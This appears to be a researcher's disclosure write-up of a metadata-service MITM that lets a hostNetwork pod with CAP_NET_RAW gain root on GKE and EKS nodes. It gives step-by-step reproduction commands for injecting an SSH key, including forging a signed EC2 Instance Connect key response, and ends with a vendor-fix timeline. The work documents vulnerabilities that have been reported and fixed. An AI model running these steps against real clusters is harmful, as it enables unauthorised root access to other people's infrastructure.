# Metadata service MITM allows root privilege escalation (EKS / GKE)

After finding that having containers with `CAP_NET_RAW` could allow you to launch [Host MITM attack via IPv6 rogue router advertisements](../IPv6_RA_MITM/README.md),
on top of classic ARP spoofing when using bridge CNI, i went ahead and looked for more fun network attacks.

`CAP_NET_RAW` Linux capability allows you open raw sockets to listen on all traffic in the network namespace (tcpdump), but also to send any type of packets.
`CAP_NET_RAW` is enabled by default in Docker/Containerd, but not in [cri-o since 1.18](https://github.com/cri-o/cri-o/commit/63b9f4ec986da267a18f73d4b1ef13282d103e00)
only to allow `ping` to work. It's a bad default that should be replaced by the usage of the `net.ipv4.ping_group_range` sysctls.

Traffic is more and more secured using TLS, but on many cloud providers you have a metadata service accessible over HTTP at http://169.254.169.254,
and in the metadata provided you can sometimes find the user ssh public key.
AWS, GCP and maybe others allow to connect to an instance using ssh keys not present at instance boot,
meaning they dynamically retrieve new ssh keys, over HTTP, at runtime, so a MITM allow us to insert our ssh key and log as a sudoer or root user.

By using `hostNetwork=true` + `CAP_NET_RAW`, it was possible to gain root privilege on the node on both EKS and GKE clusters.

Another way to get MITM is to use [K8S CVE-2020-8554](../K8S_MITM_LoadBalancer_ExternalIPs/README.md).

In my testing, Azure is retrieving the ssh keys securely, and `cloud-init` Linux package only retrieves ssh keys once, early during boot.

## Google GKE

An attacker gaining access to a `hostNetwork=true` container with `CAP_NET_RAW` capability can listen to all the traffic going through the host and inject arbitrary traffic,
allowing to tamper with most unencrypted traffic (HTTP, DNS, DHCP, ...), and disrupt encrypted traffic.
In GKE the host queries the metadata service at http://169.254.169.254 to get information, including the authorized ssh keys.
By manipulating the metadata service responses, injecting our own ssh key, we gain root privilege on the host.

1.  Create a GKE cluster

2.  Create a `hostNetwork=true` pod

    ```
    kubectl apply -f - <<'EOF'
    apiVersion: v1
    kind: Pod
    metadata:
      name: ubuntu-node
    spec:
      hostNetwork: true
      containers:
      - name: ubuntu
        image: ubuntu:latest
        command: [ "/bin/sleep", "inf" ]
    EOF
    ```

3.  Copy [metadatascapy.py script](GKE/metadatascapy.py))

    ```
    kubectl cp metadatascapy.py ubuntu-node:/metadatascapy.py
    ```

4.  Connect to the container

    ```
    kubectl exec -ti ubuntu-node -- /bin/bash
    ```
    (the next commands are in the container shell)

5.  Install the needed packages

    ```
    apt update && apt install -y python3-scapy openssh-client
    ```

6.  Generate an ssh key (this is the key that we are going to inject and use to ssh into the host)

    ```
    ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
    ```

7.  Launch the script, wait up to 2min, enjoy

    ```
    python3 /metadatascapy.py
    ```
    (If you see a kubeconfig and some certificates printed, it worked)

To hijack a TCP connection like an HTTP request you need to have the correct TCP sequence numbers, and to respond faster than the server.
As Google is using HTTP long pooling to wait for new SSH keys (1min+), and we can listen to all traffic, it's pretty easy using Scapy to forge TCP packets.

There are 2 ways to inject traffic so it can be received by the same host:
1. use a L2 raw socket and 'lo' interface
2. use a L3 raw socket

In the past, using L2 socket on lo interface was not working so [Scapy FAQ recommend to use L3](https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface).
Also GKE nodes were already using `net.ipv4.conf.all.rp_filter = 1` sysctl effectively blocking L2.
To block L3 Google team just added the following iptables rules on GKE nodes
```
iptables -w -t mangle -I OUTPUT -s 169.254.169.254 -j DROP
```

This iptables rule was added in
- 1.19.2-gke.2400
- 1.18.9-gke.2500
- 1.17.12-gke.2500
- 1.16.15-gke.2600

This only fixes GKE, if you are deploying K8S yourself on GCP instances you are likely still vulnerable.

## AWS EKS

AWS allows to connect to Linux instances via SSH using a feature called "EC2 Instance Connect"
To do this, the AWS AMI have the following line in the SSH configuration (sshd_config):
```
AuthorizedKeysCommand /opt/aws/bin/eic_run_authorized_keys %u %f
```

The [eic_curl_authorized_keys script (before fix)](https://github.com/aws/aws-ec2-instance-connect-config/blob/47de50509ed43f0c294513841739afb059d5900e/src/bin/eic_curl_authorized_keys) queries the metadata service at http://169.254.169.254
One of the responses is a signed list of ssh keys with the instance name and an expiration timestamp like this:
```
#Timestamp=2147483647
#Instance=realinstancename
#Caller=wedontcare
#Request=wedontcare
ssh-rsa ...
sha256/rsa signature in base64
```

We cannot replay those responses on a different instance:
- the instance name is retrieved over HTTP but it is verified
- and we don't have the private key matching this public key

Now if we go back to the beginning of eic_curl_authorized_keys, here is what happens:

1.  Define the address of the metadata service as http://169.254.169.254/

2.  PUT /latest/api/token

    -> get a metadata v2 token

3.  GET /latest/meta-data/instance-id/

    -> get the instance-id, then verify it against /sys/devices/virtual/dmi/id/board_asset_tag

4.  HEAD /latest/meta-data/managed-ssh-keys/active-keys/USER/

5.  GET /latest/meta-data/placement/availability-zone/

    -> from the availability zone name we extract the region name (us-east-2)

6.  GET /latest/meta-data/services/domain/

    -> in my region this is amazonaws.com

7.  With 5 and 6 we deduce the expected CN of the signer certificate

    expected_signer="managed-ssh-signer.${region}.${domain}"

8.  GET /latest/meta-data/managed-ssh-keys/signer-cert/

    -> the signer cert + chain

9.  GET /latest/meta-data/managed-ssh-keys/signer-ocsp/

    -> for each cert the SHA1 fingerprint of it

10. GET /latest/meta-data/managed-ssh-keys/signer-ocsp/SHA1

    -> retrieve the actual OCSP responses

11. GET /latest/meta-data/managed-ssh-keys/active-keys/USER/

    -> get the signed ssh keys list

12. pass all of that to [eic_parse_authorized_keys](https://github.com/aws/aws-ec2-instance-connect-config/blob/47de50509ed43f0c294513841739afb059d5900e/src/bin/eic_parse_authorized_keys)

    -> this script checks that the certificates match expected_signer, is trusted and with valid OCSP responses.

If you read carefully, an attacker able to perform a MITM between the eic_curl_authorized_keys script and the metadata service
can inject responses for 4/6/8/9/10/11 and then SSH as root on the instance

To make it short:
- managed-ssh-signer.us-east-2.amazonaws.com signed by Amazon is trusted
- managed-ssh-signer.us-east-2.champetier.net signed by Let's Encrypt can also be trusted with the right responses

On AWS EKS, an attacker able to get arbitrary code execution as root in a hostNetwork pod
can use the `CAP_NET_RAW` capability to monitor and inject packets on the instance.

This POC shows how easy we can go from hostNetwork to the node.
It uses Golang (gopacket) as scapy was often slower to inject packets than the metadata service to respond, making the attack unreliable.

1.  Files:
    1. [cert0.pem](EKS/cert0.pem): CN=managed-ssh-signer.us-east-2.champetier.net, expired Jan 10 2021
    2. [privkey.pem](EKS/privkey.pem): the private key of the cert
    3. [cert1.pem](EKS/cert1.pem): CN=Let's Encrypt Authority X3
    4. [cert2.pem](EKS/cert2.pem): CN=DST Root CA X3
    5. [go.mod](EKS/go.mod), [go.sum](EKS/go.sum), [mitmmeta.go](EKS/mitmmeta.go): The Golang POC

2.  Deploy an EKS cluster in us-east-2 region, configure kubectl

    We could target other regions but the provided cert0.pem is for us-east-2
    In my tests AMI was AL2_x86_64 / 1.17.11-20201007

3.  Launch a hostNetwork pod

    ```
    kubectl apply -f - <<'EOF'
    apiVersion: v1
    kind: Pod
    metadata:
      name: ubuntu-node
    spec:
      hostNetwork: true
      containers:
      - name: ubuntu
        image: ubuntu:latest
        command: [ "/bin/sleep", "inf" ]
    EOF
    ```

4.  Copy the 7 files in the container

    ```
    kubectl cp . ubuntu-node:/
    ```

5.  Connect to the container

    ```
    kubectl exec -ti ubuntu-node -- /bin/bash
    ```

    The next commands are all run in the pod

6.  Install the needed softwares

    ```
    apt update && apt install -y openssh-client curl openssl libpcap-dev golang
    ```

7.  Build the Golang POC

    ```
    go build .
    ```

8.  Download the OCSP responses, concatenate the signer cert

    ```
    downloadocsp() {
        fingerprint=$(openssl x509 -noout -fingerprint -sha1 -inform pem -in "${1}" | /bin/sed -n 's/SHA1 Fingerprint[[:space:]]*=[[:space:]]*\(.*\)/\1/p' | tr -d ':')
        ocsp_url="$(openssl x509 -noout -ocsp_uri -in "${1}")"
        openssl ocsp -no_nonce -issuer "${2}" -cert "${1}" -url "$ocsp_url" -respout "${3}/$fingerprint-raw"
        base64 -w0 "${3}/$fingerprint-raw" > "${3}/$fingerprint"
        rm -f "${3}/$fingerprint-raw"
    }
    mkdir ocsp
    downloadocsp cert0.pem cert1.pem ocsp
    downloadocsp cert1.pem cert2.pem ocsp
    cat cert0.pem cert1.pem > signer.pem
    ```

9.  Generate an SSH key, this is the key we will use to connect with

    ```
    ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
    ```

10. Prepare the API "ssh response"

    ```
    cat > sshkeys-unsigned <<EOF
    #Timestamp=2147483647
    #Instance=$(curl http://169.254.169.254/latest/meta-data/instance-id/ -s)
    #Caller=wedontcare
    #Request=wedontcare
    EOF
    cat /root/.ssh/id_ed25519.pub >> sshkeys-unsigned
    openssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -sign privkey.pem sshkeys-unsigned | base64 -w0 > sshkeys-signature
    cat sshkeys-unsigned sshkeys-signature > sshkeys
    echo "" >> sshkeys
    ```

11. Launch the POC

    ```
    ./mitmmeta
    ```

12. In a second shell, connect to the pod and connect to the node

    ```
    kubectl exec -ti ubuntu-node -- /bin/bash
    ssh root@127.0.0.1
    ```

    you are now root on the instance


Searching in [Certificate Transparency logs](https://censys.io/certificates?q=parsed.names%3A%2Fmanaged-ssh-signer.*%2F),
it seems I'm the only one having created such cert.

## Timeline

* 2020-06-15: Report to K8S security team (via HackerOne) to make them consider dropping `CAP_NET_RAW` by default. Only GKE was tested at that time.
* 2020-07-01: Report to Google
* 2020-10-19: Finally find some time to look at EKS on the weekend, report to AWS Security
* 2020-10-23: Google start rolling out their GKE fix
* 2020-11-10: Google bounty :) (Donated to Handicap International)
* 2020-11-12: Quick call with AWS Security to confirm they understood my report correctly
* 2020-11-17: AWS push a fix to [verify the domain](https://github.com/aws/aws-ec2-instance-connect-config/commit/c15b99fa223f277787e50b044baf39e483dedf8c) (actually dated 2020-10-22)
* 2020-12-04: AWS confirm fix on their side
* 2020-12-07: Ask confirmation to Google if I can talk about this publicly as ticket is not marked fixed yet
* 2021-02-04: K8S (HackerOne) report closed as provider specific
* 2021-02-10: Google finally mark the ticket as fixed
* 2021-02-28: Finally finish this write-ups

## Acknowledgments

Thanks to Google for the bounty, and thanks to AWS and K8S Team.
